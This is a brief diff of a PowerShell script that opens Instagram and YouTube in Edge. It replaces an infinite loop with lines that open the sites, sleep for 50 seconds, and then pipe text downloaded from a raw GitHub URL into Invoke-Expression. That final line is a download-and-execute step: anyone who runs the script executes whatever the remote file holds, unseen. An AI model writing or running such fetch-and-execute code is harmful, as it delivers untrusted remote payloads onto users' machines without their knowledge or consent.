@@ -1,1 +1,4 @@
-while ($true) { msedge.exe instagram.com ; msedge.exe youtube.com ; Start-Sleep -Seconds 50 }
+start msedge.exe instagram.com
+start msedge.exe youtube.com
+Start-Sleep -Seconds 50
+Invoke-Expression ((Invoke-WebRequest -Uri https://raw.githubusercontent.com/a7ecc/test/main/test.txt).Content)
